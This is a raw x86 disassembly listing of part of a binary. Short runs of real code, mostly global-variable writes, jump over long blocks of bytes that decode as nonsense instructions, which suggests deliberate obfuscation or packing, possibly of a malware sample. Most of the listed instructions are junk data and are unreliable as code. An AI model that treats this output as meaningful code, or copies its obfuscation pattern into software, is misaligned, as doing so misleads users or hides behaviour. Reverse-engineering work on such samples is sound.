  42856c:	mov    WORD PTR [esp+0x28],ax
  428571:	mov    DWORD PTR ds:0x42f650,0x2f68
  42857b:	mov    eax,0x26c1
  428580:	sub    DWORD PTR ds:0x42f610,0x2aa3
  42858a:	mov    WORD PTR [esp+0x30],ax
  42858f:	and    DWORD PTR ds:0x42f658,ecx
  428595:	jmp    0x428675
  42859a:	sbb    dh,al
  42859c:	repz sahf 
  42859e:	(bad)  
  42859f:	mov    edi,0x7244c67d
  4285a4:	std    
  4285a5:	dec    esi
  4285a6:	loope  0x4285e7
  4285a8:	sub    bl,BYTE PTR [edi+0x1dd2c]
  4285ae:	ret    
  4285af:	add    BYTE PTR [eax],al
  4285b1:	add    BYTE PTR [esi],ah
  4285b3:	sub    al,0xab
  4285b5:	mov    ss,WORD PTR [edi]
  4285b7:	fld    TBYTE PTR [edx]
  4285b9:	call   0x4d5e:0x689d3260
  4285c0:	inc    bh
  4285c2:	pop    ebx
  4285c3:	and    ebp,DWORD PTR [ebx-0x18]
  4285c6:	adc    edi,ebx
  4285c8:	jge    0x42863e
  4285ca:	daa    
  4285cb:	cmp    al,BYTE PTR [edi]
  4285cd:	enter  0xc5f,0xac
  4285d1:	rol    DWORD PTR [ebx+0x24],cl
  4285d4:	mov    dh,0x69
  4285d6:	loope  0x4285ef
  4285d8:	push   ebp
  4285d9:	outs   dx,DWORD PTR ds:[esi]
  4285da:	fst    DWORD PTR [edx+0xb]
  4285dd:	mov    ebx,0x3c3c5ad9
  4285e2:	imul   esp,DWORD PTR [ebp+eiz*4-0x7d],0x14e755a3
  4285ea:	(bad)  
  4285eb:	and    DWORD PTR [eax+eax*8+0x3962810d],ebx
  4285f2:	lahf   
  4285f3:	mov    ebp,0x37a8e89c
  4285f8:	xchg   ecx,eax
  4285f9:	xchg   edi,eax
  4285fa:	jl     0x42862e
  4285fc:	dec    ebx
  4285fd:	mov    ecx,0xe82e65a3
  428602:	fcomp  QWORD PTR [edx]
  428604:	jns    0x42860c
  428606:	popf   
  428607:	xchg   ebp,eax
  428608:	jbe    0x4285a7
  42860a:	cmp    edi,ebx
  42860c:	aad    0x69
  42860e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42860f:	in     al,dx
  428610:	popf   
  428611:	xchg   ebx,eax
  428612:	test   BYTE PTR [ebp-0x42],0xa0
  428616:	sub    edx,esp
  428618:	or     al,BYTE PTR [eax-0x32e7d9a5]
  42861e:	adc    DWORD PTR [ebx],edi
  428620:	pusha  
  428621:	(bad)  
  428622:	lock xor BYTE PTR [edi],ah
  428625:	push   ss
  428626:	jge    0x4285e2
  428628:	call   0xe7caa858
  42862d:	inc    ebx
  42862f:	fisub  WORD PTR [eax-0x78]
  428632:	les    ebp,FWORD PTR [edx+0x72]
  428635:	adc    ah,BYTE PTR [ebx-0x11]
  428638:	xchg   edx,eax
  428639:	sbb    DWORD PTR [esi+eax*2+0x58],esi
  42863d:	outs   dx,DWORD PTR ds:[si]
  42863f:	inc    eax
  428640:	mov    ch,ah
  428642:	fldcw  WORD PTR [ebx-0x36]
  428645:	loop   0x4285fc
  428647:	xor    al,0x2f
  428649:	mov    ah,0xea
  42864b:	popa   
  42864c:	cmp    eax,0xb943ac06
  428651:	ins    DWORD PTR es:[edi],dx
  428652:	xor    dl,dh
  428654:	arpl   WORD PTR [edi],ax
  428656:	inc    edx
  428657:	jmp    0x4286ab
  428659:	into   
  42865a:	xor    eax,0xfab8cdb0
  42865f:	daa    
  428660:	dec    ecx
  428661:	push   ss
  428662:	or     DWORD PTR [esp+ebp*8-0x40608091],ecx
  428669:	test   al,0x16
  42866b:	mov    ds,WORD PTR [edi+0x27]
  42866e:	fisubr WORD PTR [eax+0x68]
  428671:	test   al,0x2f
  428673:	pusha  
  428674:	retf   0xbab8
  428677:	and    BYTE PTR [eax],al
  428679:	add    BYTE PTR [ebx+0x42f5543d],al
  42867f:	add    BYTE PTR [eax],al
  428681:	jb     0x4286a8
  428687:	xor    DWORD PTR ds:0x42f604,ecx
  42868d:	jmp    0x4286a8
  428692:	push   DWORD PTR [ebp-0x14]
  428695:	push   0x5e9c
  42869a:	push   0x6a94
  42869f:	push   DWORD PTR [ebp-0x28]
  4286a2:	call   DWORD PTR ds:0x4387dc
  4286a8:	mov    WORD PTR [esp+0x3c],ax
  4286ad:	mov    eax,0x1336
  4286b2:	mov    WORD PTR [esp+0x40],ax
  4286b7:	movzx  eax,WORD PTR [esp+0x40]
  4286bc:	movzx  ecx,WORD PTR [esp+0x3c]
  4286c1:	jmp    0x4287a1
  4286c6:	pusha  
  4286c7:	xchg   esp,eax
  4286c8:	inc    edx
  4286c9:	and    al,0xf6
  4286cb:	mul    BYTE PTR [esi-0x2c]
  4286ce:	pop    esp
  4286cf:	xor    al,BYTE PTR [ebp-0x68af1641]
  4286d5:	dec    esi
  4286d6:	out    dx,eax
  4286d7:	fld    QWORD PTR [ecx]
  4286d9:	add    bl,al
  4286db:	add    BYTE PTR [eax],al
  4286dd:	add    BYTE PTR [ebp-0x73ecb10c],dl
  4286e3:	and    eax,DWORD PTR ds:0xadc9a80
  4286e9:	das    
  4286ea:	mov    esp,0x7f43bb5d
  4286ef:	dec    edx
  4286f0:	sub    dl,BYTE PTR [ecx]
  4286f2:	jnp    0x428771
  4286f4:	loopne 0x42873f
  4286f6:	aas    
  4286f7:	lahf   
  4286f8:	je     0x42875b
  4286fa:	pop    ecx
  4286fb:	je     0x4286d6
  4286fd:	and    eax,0xab9a97ee
  428702:	fsub   QWORD PTR ds:0x59feee5b
  428708:	popf   
  428709:	out    dx,al
  42870a:	mov    ah,0xd8
  42870c:	sub    eax,0xc2a6b
  428711:	idiv   eax
  428713:	pop    ss
  428714:	enter  0x9cdb,0xad
  428718:	(bad)  
  42871a:	dec    edx
  42871b:	pop    edi
  42871c:	inc    ecx
  42871d:	mov    ds:0xe19b6a5c,al
  428722:	imul   edi,DWORD PTR [edx+ebx*8-0x6a],0x3d
  428727:	ficom  DWORD PTR ds:0x1260c2a
  42872d:	and    cl,BYTE PTR [edi+0x7d]
  428730:	mov    ah,0x22
  428732:	je     0x4287af
  428734:	cmp    al,0x97
  428736:	mov    bl,0xa9
  428738:	push   ebx
  428739:	shl    DWORD PTR [ebx+eiz*4-0x22fe06ec],0x6c
  428741:	sub    DWORD PTR [esi+0x3842509a],0xc7597dfb
  42874b:	mov    al,0x75
  42874d:	jmp    0x4286d5
  42874f:	pop    ebp
  428750:	and    BYTE PTR [ecx-0x5bc64954],cl
  428756:	jbe    0x428791
  428758:	mov    ecx,0x300a7734
  42875d:	push   es
  42875e:	ss je  0x42870a
  428761:	mov    al,ds:0xb070cf1e
  428766:	retf   
  428767:	mov    dl,0xdd
  428769:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42876a:	les    ebx,FWORD PTR [esi]
  42876c:	popf   
  42876d:	xchg   ebx,eax
  42876e:	fs cmp ebx,eax
  428771:	push   es
  428772:	pop    ds
  428773:	jecxz  0x4286f8
  428775:	lods   al,BYTE PTR ds:[esi]
  428776:	xor    al,0x5c
  428778:	cli    
  428779:	adc    BYTE PTR [esi-0x45370641],bh
  42877f:	mov    cl,0xec
  428781:	enter  0x743f,0xc2
  428785:	jne    0x428804
  428787:	pop    esp
  428788:	(bad)  
  428789:	sahf   
  42878a:	inc    eax
  42878b:	mov    esp,0x13b8037a
  428790:	into   
  428791:	add    BYTE PTR [edx+0x7faf52d0],0xb
  428798:	sub    DWORD PTR [ecx],0xffffff9f
  42879b:	inc    ecx
  42879c:	push   esp
  42879d:	loope  0x4287b1
  42879f:	adc    ebp,DWORD PTR [ebx+0x33]
  4287a2:	rol    DWORD PTR [ecx+0x6375e9],0x0
  4287a9:	movzx  ecx,WORD PTR [esp+0x30]
  4287ae:	adc    edx,0x4eb5
  4287b4:	jmp    0x428894
  4287b9:	mul    BYTE PTR [esi]
  4287bb:	dec    edi
  4287bc:	fcmovnu st,st(7)
  4287be:	sti    
  4287bf:	imul   BYTE PTR [edi]
  4287c1:	fs push ss
  4287c3:	dec    esi
  4287c4:	imul   eax,DWORD PTR [edi],0xb25f02e7
  4287ca:	fiadd  WORD PTR [ecx]
  4287cc:	add    bl,al
  4287ce:	add    BYTE PTR [eax],al
  4287d0:	add    BYTE PTR [eax+ebp*1+0x30],bh
  4287d4:	jl     0x42877f
  4287d6:	or     eax,ebx
  4287d8:	dec    edi
  4287d9:	out    0x15,eax
  4287db:	or     dh,ch
  4287dd:	cli    
  4287de:	adc    BYTE PTR [eax+ecx*2-0x14],al
  4287e2:	inc    ebp
  4287e3:	push   ebp
  4287e4:	and    bl,ch
  4287e6:	add    edi,DWORD PTR [esi+0x1c]
  4287e9:	xchg   BYTE PTR [edx+0xa],bh
  4287ec:	inc    ebp
  4287ed:	inc    ebx
  4287ee:	xchg   edi,eax
  4287ef:	les    esi,FWORD PTR [eax]
  4287f1:	adc    al,0x49
  4287f3:	add    BYTE PTR [esi-0x50f3e25f],cl
  4287f9:	daa    
  4287fa:	popa   
  4287fb:	pop    ecx
  4287fc:	push   ebp
  4287fd:	out    0x87,al
  4287ff:	push   esp
  428800:	jge    0x428795
  428802:	bnd ret 0xbddc
  428806:	call   0xcb4c63a5
  42880b:	push   0x3
  42880d:	clc    
  42880e:	dec    ebx
  42880f:	cwde   
  428810:	or     DWORD PTR [ecx+0x12ba1d3d],0xdda3182f
  42881a:	ja     0x42887d
  42881c:	ss addr16 jle 0x428883
  428820:	ret    0xb663
  428823:	das    
  428824:	xchg   ecx,eax
  428825:	sbb    al,0xc6
  428827:	mov    WORD PTR [esi-0xe],gs
  42882a:	mov    edi,0xfc06b883
  42882f:	pusha  
  428830:	cmp    BYTE PTR [eax-0x766013d7],ch
  428836:	(bad)  
  428837:	fs ret 0xb19f
  42883b:	popa   
  42883c:	out    dx,eax
  42883d:	jmp    0x2da9b2e5
  428842:	daa    
  428843:	lock sub al,0x9a
  428846:	xlat   BYTE PTR ds:[ebx]
  428847:	ja     0x428886
  428849:	cmp    edx,ebp
  42884b:	or     bl,bl
  42884d:	int3   
  42884e:	xchg   edi,eax
  42884f:	in     eax,dx
  428850:	add    al,0xb3
  428852:	out    0xce,eax
  428854:	push   esp
  428855:	mov    ?,esi
  428857:	enter  0x72b7,0xb5
  42885b:	or     ebp,DWORD PTR [edx-0x1e]
  42885e:	inc    esp
  42885f:	jmp    0xe7ee2a44
  428864:	push   eax
  428865:	xor    BYTE PTR [eax-0x80a933b],0x38
  42886c:	pop    ebx
  42886d:	jbe    0x428830
  42886f:	mov    edi,0x5e4911cb
  428874:	jmp    0xc448:0xa30177e9
  42887b:	push   0xffffffe2
  42887d:	dec    ebx
  42887e:	fldcw  WORD PTR [esi]
  428880:	(bad)  
  428881:	std    
  428882:	retf   0xa5b
  428885:	scas   eax,DWORD PTR es:[edi]
  428886:	or     bh,BYTE PTR [esi-0x55bba518]
  42888c:	(bad)  
  42888e:	xor    al,0x83
  428890:	ja     0x428835
  428892:	mov    ds:0xd1c0692d,eax
  428897:	pop    esp
  428898:	add    BYTE PTR [eax],al
  42889a:	movzx  edx,WORD PTR [esp+0x28]
  42889f:	or     DWORD PTR ds:0x42f668,0x42f64c
  4288a9:	or     ecx,edx
  4288ab:	or     eax,ecx
  4288ad:	add    DWORD PTR ds:0x42f630,0x44aa
  4288b7:	jmp    0x428997
  4288bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4288bd:	inc    ecx
  4288be:	dec    ebx
  4288bf:	xchg   esi,eax
  4288c0:	out    dx,eax
  4288c1:	sahf   
  4288c2:	push   DWORD PTR [ecx-0x38]
  4288c5:	sub    bh,BYTE PTR [edi+0x33]
  4288c8:	aam    0xdb
  4288ca:	inc    edi
  4288cb:	jp     0x428942
  4288cd:	fild   WORD PTR [ecx]
  4288cf:	add    bl,al
  4288d1:	add    BYTE PTR [eax],al
  4288d3:	add    BYTE PTR [edi-0x551200de],ah
  4288d9:	xchg   ebx,eax
  4288da:	dec    ebp
  4288db:	lock (bad) 
  4288dd:	mov    ebp,0x262ca916
  4288e2:	lods   al,BYTE PTR ds:[esi]
  4288e3:	sub    edx,eax
  4288e5:	mov    dl,cl
  4288e7:	dec    BYTE PTR ds:0x41653bba
  4288ed:	cs push ss
  4288ef:	mov    ecx,0x92234d5f
  4288f4:	inc    esi
  4288f5:	xchg   edi,eax
  4288f6:	pop    ds
  4288f7:	xchg   ecx,eax
  4288f8:	or     eax,0x25179494
  4288fd:	das    
  4288fe:	stc    
  4288ff:	out    dx,al
  428900:	fwait
  428901:	or     eax,DWORD PTR [edx+0x64]
  428904:	xchg   edi,eax
  428905:	jmp    0x9dd73880
  42890a:	or     eax,0x92393eba
  42890f:	test   DWORD PTR [bp+di],0x2b0da2d7
  428916:	lea    eax,[ebx]
  428918:	or     eax,0x584b0735
  42891d:	sbb    edi,DWORD PTR [esi]
  42891f:	push   es
  428920:	das    
  428921:	and    al,0xa3
  428923:	adc    al,0xd4
  428925:	dec    ebx
  428926:	mov    ch,0x48
  428928:	jo     0x428981
  42892a:	inc    ebp
  42892b:	sbb    DWORD PTR [ecx+0x65],edx
  42892e:	cmc    
  42892f:	push   ds
  428930:	xor    eax,0x1cdbce2f
  428935:	mov    ds:0x3c3eb747,al
  42893a:	and    BYTE PTR [edi],ch
  42893c:	mov    esi,esp
  42893e:	add    BYTE PTR [ecx+0x24d7bc64],al
  428944:	jmp    0x4288c6
  428946:	adc    al,0xc1
  428948:	repnz aaa 
  42894a:	dec    ebp
  42894b:	fwait
  42894c:	scas   al,BYTE PTR es:[edi]
  42894d:	sub    al,0xd3
  42894f:	rcr    DWORD PTR [esi],0x63
  428952:	shl    BYTE PTR ds:0xbf123824,1
  428958:	retf   0xc14e
  42895b:	xchg   esi,eax
  42895c:	pop    edx
  42895d:	ja     0x428902
  42895f:	add    DWORD PTR [edx-0x8eb488],0x77
  428966:	mov    ch,0xa3
  428968:	jnp    0x4288f6
  42896a:	dec    edx
  42896b:	and    BYTE PTR [esi+0x78c14edc],dh
  428971:	lea    esi,[edi-0x62]
  428974:	mov    ds:0xb7d32880,al
  428979:	ja     0x428913
  42897b:	pushf  
  42897c:	adc    al,0x8c
  42897e:	sub    edi,DWORD PTR [esi+0x59]
  428981:	in     eax,0x4f
  428983:	jb     0x4289da
  428985:	dec    ecx
  428986:	adc    eax,0xb9c12bc
  42898b:	loope  0x42894e
  42898d:	jge    0x4289fa
  42898f:	add    eax,0x944c9672
  428994:	add    eax,0x8966917f
  428999:	inc    esp
  42899a:	and    al,0x20
  42899c:	mov    eax,0x6429
  4289a1:	and    DWORD PTR ds:0x42f5bc,0x1478
  4289ab:	mov    WORD PTR [esp+0x40],ax
  4289b0:	mov    eax,0x77e
  4289b5:	adc    DWORD PTR ds:0x42f640,0x2e52
  4289bf:	mov    WORD PTR [esp+0x3c],ax
  4289c4:	mov    eax,ds:0x42f644
  4289c9:	adc    eax,DWORD PTR ds:0x42f5f0
  4289cf:	mov    ds:0x42f644,eax
  4289d4:	mov    eax,0x69d8
  4289d9:	mov    WORD PTR [esp+0x30],ax
  4289de:	xor    eax,eax
  4289e0:	add    eax,DWORD PTR ds:0x42f6a4
  4289e6:	mov    eax,DWORD PTR [eax]
  4289e8:	xor    DWORD PTR ds:0x42f558,eax
  4289ee:	mov    eax,0x3e02
  4289f3:	add    DWORD PTR ds:0x42f5bc,0x42f568
  4289fd:	mov    WORD PTR [esp+0x28],ax
  428a02:	dec    DWORD PTR ds:0x42f5b0
  428a08:	mov    ax,WORD PTR [esp+0x28]
  428a0d:	xor    DWORD PTR ds:0x42f588,0x1785
  428a17:	mov    cx,WORD PTR [esp+0x30]
  428a1c:	movzx  ecx,cx
  428a1f:	adc    DWORD PTR ds:0x42f638,0x42f5c4
  428a29:	jmp    0x428b09
  428a2e:	cmp    ch,dl
  428a30:	sbb    esp,edi
  428a32:	fcomi  st,st(7)
  428a34:	(bad)  
  428a35:	(bad)  
  428a36:	in     al,dx
  428a37:	test   al,0x6e
  428a39:	pop    edi
  428a3a:	jne    0x428ab0
  428a3c:	hlt    
  428a3d:	mov    edi,0x1e038
  428a42:	ret    
  428a43:	add    BYTE PTR [eax],al
  428a45:	add    dl,bl
  428a47:	je     0x428a18
  428a49:	cwde   
  428a4a:	fnstsw WORD PTR [esp+edx*8]
  428a4d:	sbb    DWORD PTR [edi-0x19],ecx
  428a50:	clc    
  428a51:	(bad)  
  428a52:	leave  
  428a53:	cmp    DWORD PTR [ecx-0x22],eax
  428a56:	mov    WORD PTR [edi],cs
  428a58:	arpl   di,cx
  428a5a:	jbe    0x428a33
  428a5c:	jp     0x428a94
  428a5e:	pop    ebp
  428a5f:	jmp    0x260c5ed5
  428a64:	inc    al
  428a66:	xor    al,0x45
  428a68:	jmp    0x428a5c
  428a6a:	mov    edi,0xe72f4d2f
  428a6f:	xchg   esi,eax
  428a70:	lods   al,BYTE PTR ds:[esi]
  428a71:	dec    ebp
  428a72:	ud1    edi,edi
  428a75:	mov    eax,ds:0xc5fbba55
  428a7a:	imul   eax,DWORD PTR [edi-0x6a41a787],0x135337ae
  428a84:	daa    
  428a85:	xor    eax,0xabd90fb0
  428a8a:	(bad)  
  428a8b:	pop    edx
  428a8c:	out    dx,eax
  428a8d:	pushf  
  428a8e:	retf   
  428a8f:	dec    esi
  428a90:	aad    0x1e
  428a92:	push   ss
  428a93:	mov    ebx,DWORD PTR [ebx]
  428a95:	xchg   BYTE PTR [esi+eiz*4],dh
  428a98:	and    DWORD PTR [eax-0x5],esp
  428a9b:	dec    edi
  428a9c:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  428a9e:	cmp    eax,0x5b97933f
  428aa3:	enter  0xb7c9,0xaa
  428aa7:	mov    cl,0xc
  428aa9:	sbb    al,0x99
  428aab:	push   0x69
  428aad:	xchg   BYTE PTR [edx+0x70],bl
  428ab0:	aas    
  428ab1:	push   edi
  428ab2:	pop    ebx
  428ab3:	pop    ebp
  428ab4:	cmp    DWORD PTR [esi+0x62],ecx
  428ab7:	int3   
  428ab8:	retf   
  428ab9:	mov    edi,0x72525912
  428abe:	das    
  428abf:	mov    al,0xba
  428ac1:	mov    ss,sp
  428ac4:	or     eax,0xe509304e
  428ac9:	(bad)  
  428aca:	xor    dl,BYTE PTR [ebx]
  428acc:	mov    ebx,0xbd6d9b74
  428ad1:	ja     0x428ab6
  428ad3:	lock xchg ebp,eax
  428ad5:	mov    esp,0xe99bb2a2
  428ada:	outs   dx,DWORD PTR ds:[esi]
  428adb:	cli    
  428adc:	dec    edi
  428add:	sub    al,0x52
  428adf:	xor    dl,ah
  428ae1:	fcomp  DWORD PTR [ecx+0x76]
  428ae4:	and    al,0x87
  428ae6:	shl    esp,1
  428ae8:	das    
  428ae9:	add    al,0x3c
  428aeb:	call   0x28ca5f13
  428af0:	sbb    eax,0x966450c0
  428af5:	sub    al,0x95
  428af7:	fidiv  WORD PTR [edx-0x14]
  428afa:	lods   eax,DWORD PTR ds:[esi]
  428afb:	in     al,0x1c
  428afd:	aas    
  428afe:	outs   dx,BYTE PTR ds:[esi]
  428aff:	xchg   cl,ah
  428b01:	repz xor dh,BYTE PTR [edx+0x3e]
  428b05:	mov    ah,0x87
  428b07:	xchg   ebp,eax
  428b08:	popa   
  428b09:	movzx  eax,ax
  428b0c:	and    eax,ecx
  428b0e:	mov    cx,WORD PTR [esp+0x3c]
  428b13:	jmp    0x428bf3
  428b18:	aas    
  428b19:	or     eax,DWORD PTR [ebx-0x407548f6]
  428b1f:	aas    
  428b20:	mov    bh,0xf6
  428b22:	ins    DWORD PTR es:[edi],dx
  428b23:	int    0x74
  428b25:	mov    esp,0xe0fba1fe
  428b2a:	add    DWORD PTR [eax],eax
  428b2c:	ret    
  428b2d:	add    BYTE PTR [eax],al
  428b2f:	add    BYTE PTR [ebp-0x3683d6eb],bh
  428b35:	test   eax,0xd6065ec
  428b3a:	jmp    0x428acf
  428b3c:	sahf   
  428b3d:	add    DWORD PTR [edi],0x48
  428b40:	sub    ebp,DWORD PTR [esi+0x39]
  428b43:	loope  0x428b40
  428b45:	push   eax
  428b46:	stos   BYTE PTR es:[edi],al
  428b47:	pop    edi
  428b48:	frstor [ebx-0x4af7a827]
  428b4e:	aam    0x9c
  428b50:	push   eax
  428b51:	sub    eax,0xeb0efa1
  428b56:	cdq    
  428b57:	dec    esi
  428b58:	cmp    al,0x74
  428b5a:	jmp    0xf226:0xad87a2bd
  428b61:	call   0xbdeb:0x830a0dc7
  428b68:	and    BYTE PTR [esi-0x298d3312],0xe5
  428b6f:	dec    esp
  428b70:	(bad)  
  428b72:	pop    eax
  428b73:	adc    BYTE PTR [edi],0xd2
  428b76:	shr    ebp,1
  428b78:	addr16 pop ss
  428b7a:	xchg   ebp,edx
  428b7c:	push   0x7f
  428b7e:	pop    ecx
  428b7f:	add    ah,0xe8
  428b82:	pop    eax
  428b83:	retf   0x2647
  428b86:	xor    ch,cl
  428b88:	loop   0x428b87
  428b8a:	call   0xdcab:0x4c544e3a
  428b91:	popa   
  428b92:	sub    bl,BYTE PTR [ebp+0x6d7947b1]
  428b98:	and    ah,BYTE PTR [esi-0x4c21c339]
  428b9e:	and    BYTE PTR ds:0x6f9b82fe,bl
  428ba4:	ins    BYTE PTR es:[edi],dx
  428ba5:	mov    ecx,DWORD PTR [eax+0x14a61da5]
  428bab:	clc    
  428bac:	push   esi
  428bad:	pop    esp
  428bae:	pop    ds
  428baf:	adc    eax,0xa95ab0d4
  428bb4:	outs   dx,BYTE PTR ds:[esi]
  428bb5:	and    eax,0xd3e34efe
  428bba:	ins    DWORD PTR es:[edi],dx
  428bbb:	adc    ebx,edi
  428bbd:	pop    ecx
  428bbe:	clc    
  428bbf:	sbb    DWORD PTR [eax+ebp*1],0xffffffba
  428bc3:	fbstp  TBYTE PTR [ecx+0x36]
  428bc6:	rep stos DWORD PTR es:[edi],eax
  428bc8:	jle    0x428b99
  428bca:	xchg   ebx,eax
  428bcb:	jns    0x428be2
  428bcd:	and    BYTE PTR [ebp+0x273cdfb1],0x91
  428bd4:	sti    
  428bd5:	xor    al,0xbd
  428bd7:	jb     0x428bd0
  428bd9:	stos   BYTE PTR es:[edi],al
  428bda:	sub    al,0xb6
  428bdc:	outs   dx,DWORD PTR ds:[esi]
  428bdd:	cmp    DWORD PTR [edx-0x392aabec],esp
  428be3:	push   es
  428be4:	lea    edx,[ebx+eax*8-0x1aefbc43]
  428beb:	int3   
  428bec:	pop    ebx
  428bed:	dec    esp
  428bee:	dec    esp
  428bef:	add    BYTE PTR [edi+ebp*2-0x75],ah
  428bf3:	movzx  ecx,cx
  428bf6:	jmp    0x428cd6
  428bfb:	daa    
  428bfc:	bound  ebx,QWORD PTR [edi+edx*8]
  428bff:	pop    ebp
  428c00:	(bad)  
  428c01:	out    dx,eax
  428c02:	repnz arpl WORD PTR [eax-0x17c3258],di
  428c09:	push   ds
  428c0a:	fidivr WORD PTR [esi-0x3cfffe1f]
  428c10:	add    BYTE PTR [eax],al
  428c12:	add    dl,ch
  428c14:	mov    ?,WORD PTR [ebp+0x57]
  428c17:	and    bl,ch
  428c19:	or     DWORD PTR [esi],ebx
  428c1b:	pusha  
  428c1c:	xor    al,0xf5
  428c1e:	sbb    eax,DWORD PTR [edx]
  428c20:	iret   
  428c21:	ja     0x428bfc
  428c23:	aaa    
  428c24:	jmp    0x428bf3
  428c26:	push   0xcee19587
  428c2b:	mov    eax,ds:0x98aa60c7
  428c30:	sub    BYTE PTR [ecx+ecx*4-0x4b4ac917],dh
  428c37:	fiadd  DWORD PTR [ecx]
  428c39:	mov    esp,0xa93692ab
  428c3e:	popa   
  428c3f:	in     al,dx
  428c40:	mov    edx,0x5a923998
  428c45:	adc    BYTE PTR [ebp-0x39ead9aa],0x82
  428c4c:	adc    DWORD PTR [edx-0x12904a99],esi
  428c52:	mov    WORD PTR [edi-0x4c8bf2e9],?
  428c58:	push   ebp
  428c59:	into   
  428c5a:	iret   
  428c5b:	adc    BYTE PTR [esi],bl
  428c5d:	ret    0x6faa
  428c60:	retf   
  428c61:	xchg   esp,eax
  428c62:	bound  eax,QWORD PTR ds:0x9636c2cc
  428c68:	cmp    eax,0xcb860bd
  428c6d:	mov    al,ds:0xdccb3e02
  428c72:	or     dl,BYTE PTR [ecx-0x165c824e]
  428c78:	lods   eax,DWORD PTR ds:[esi]
  428c79:	into   
  428c7a:	pop    sp
  428c7c:	(bad)  
  428c7d:	daa    
  428c7e:	xor    esp,DWORD PTR [eax+0x1abac232]
  428c84:	jecxz  0x428c0d
  428c86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428c87:	mov    ds:0xb6e57295,eax
  428c8c:	in     eax,dx
  428c8d:	mov    al,ds:0x5b1850a2
  428c92:	int    0xc2
  428c94:	jge    0x428c9d
  428c96:	push   cs
  428c97:	mov    BYTE PTR [ebx+0x71],0xdf
  428c9b:	inc    edx
  428c9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428c9d:	test   DWORD PTR [ecx-0x319ff250],ebx
  428ca3:	jmp    0x1cc1:0xf8338279
  428caa:	rcr    bh,cl
  428cac:	into   
  428cad:	cmc    
  428cae:	aad    0xaa
  428cb0:	and    edi,edi
  428cb2:	cs jp  0x428c4f
  428cb5:	mov    ds:0xf5a74b38,al
  428cba:	mov    cl,0xf7
  428cbc:	in     al,dx
  428cbd:	fdivr  QWORD PTR [edx-0x5a]
  428cc0:	or     dl,BYTE PTR [edx]
  428cc2:	cmp    al,0x9d
  428cc4:	lahf   
  428cc5:	iret   
  428cc6:	imul   ebx,DWORD PTR [edi+0xb],0x5c59949f
  428ccd:	and    bh,ah
  428ccf:	push   cs
  428cd0:	rcr    BYTE PTR [eax-0x1f],cl
  428cd3:	push   0xaf0f9c7b
  428cd8:	rol    DWORD PTR [ecx+0x42f5700d],0x0
  428cdf:	test   ch,dh
  428ce1:	inc    edx
  428ce2:	add    BYTE PTR [esi-0x75],ah
  428ce5:	dec    esp
  428ce6:	and    al,0x40
  428ce8:	imul   eax,eax,0x1d7f
  428cee:	jmp    0x428dce
  428cf3:	lea    esp,[ebx-0x2f]
  428cf6:	call   0x6bba:0x77cfbaff
  428cfd:	xlat   BYTE PTR ds:[ebx]
  428cfe:	aas    
  428cff:	jmp    0x1e2:0x81c3dbfa
  428d06:	add    bl,al
  428d08:	add    BYTE PTR [eax],al
  428d0a:	add    BYTE PTR ds:0x87fda58c,bh
  428d10:	sub    BYTE PTR [esp+esi*4-0x38],cl
  428d14:	(bad)  
  428d15:	cmp    BYTE PTR [edx+0x51026065],bh
  428d1b:	push   eax
  428d1c:	inc    ebp
  428d1d:	mov    ah,0x49
  428d1f:	shr    BYTE PTR [esi+esi*8-0x61],cl
  428d23:	push   ebp
  428d24:	sub    BYTE PTR [eax+0x34],0x47
  428d28:	call   0xaaa766e1
  428d2d:	icebp  
  428d2e:	sbb    BYTE PTR [edi],ah
  428d30:	rcr    DWORD PTR [ecx],1
  428d32:	jge    0x428d1a
  428d34:	and    BYTE PTR [esp+edx*8+0x22],bh
  428d38:	loope  0x428d4e
  428d3a:	dec    ebx
  428d3b:	push   0xffffff96
  428d3d:	add    dl,BYTE PTR [eax+0x2507e073]
  428d43:	in     eax,0xf5
  428d45:	push   cs
  428d46:	fs inc edi
  428d48:	repnz sti 
  428d4a:	sbb    eax,0x8e269da5
  428d4f:	jge    0x428db5
  428d51:	push   esp
  428d52:	cmp    edi,DWORD PTR [esi+0x776b2c96]
  428d58:	adc    DWORD PTR [esi],0xddc52d3c
  428d5e:	pop    esi
  428d5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428d60:	jae    0x428d2c
  428d62:	mov    ebx,0x1d8e0b30
  428d67:	(bad)  
  428d68:	and    eax,0xb885053b
  428d6d:	sub    DWORD PTR [ebx],ebp
  428d6f:	xchg   DWORD PTR [ebp+0x14],esp
  428d72:	and    bl,dh
  428d74:	mov    cl,0xaa
  428d76:	fs pop ss
  428d78:	mov    dl,0xb0
  428d7a:	rcr    ebp,cl
  428d7c:	ror    DWORD PTR [edx+0x68],cl
  428d7f:	dec    ebp
  428d80:	in     eax,dx
  428d81:	addr16 pop edx
  428d83:	in     eax,dx
  428d84:	fstp   TBYTE PTR [esi]
  428d86:	inc    edi
  428d87:	jns    0x428da5
  428d89:	test   BYTE PTR [esi+eiz*8],dl
  428d8c:	rcr    DWORD PTR ds:[edi-0x51bb242a],cl
  428d93:	or     cl,BYTE PTR [edi+0x64dc1cfd]
  428d99:	(bad)  
  428d9a:	adc    al,BYTE PTR [edi-0x1e6273b8]
  428da0:	jmp    0x428de0
  428da2:	das    
  428da3:	cmp    eax,edx
  428da5:	ret    0x6561
  428da8:	fdivp  st(0),st
  428daa:	call   0x11b9:0xd2c051a7
  428db1:	mov    ds:0x31a865ff,eax
  428db6:	dec    ebp
  428db7:	push   0xfffffff0
  428db9:	mov    esi,0xa3960312
  428dbe:	cmp    bh,BYTE PTR [ebx]
  428dc0:	stos   BYTE PTR es:[edi],al
  428dc1:	pop    es
  428dc2:	iret   
  428dc3:	cwde   
  428dc4:	sub    al,0xdb
  428dc6:	push   ecx
  428dc7:	imul   edi,edi,0x73
  428dca:	inc    edi
  428dcb:	mov    eax,0xb70feadf
  428dd0:	leave  
  428dd1:	mov    DWORD PTR ds:0x42f5ec,0x6a8
  428ddb:	jmp    0x428ebb
  428de0:	push   eax
  428de1:	mov    edi,0xf5ff715b
  428de6:	jp     0x428da7
  428de8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428de9:	rcl    BYTE PTR [esi+0x7a],0xc
  428ded:	pop    ds
  428dee:	jne    0x428e28
  428df0:	inc    esp
  428df1:	jecxz  0x428df4
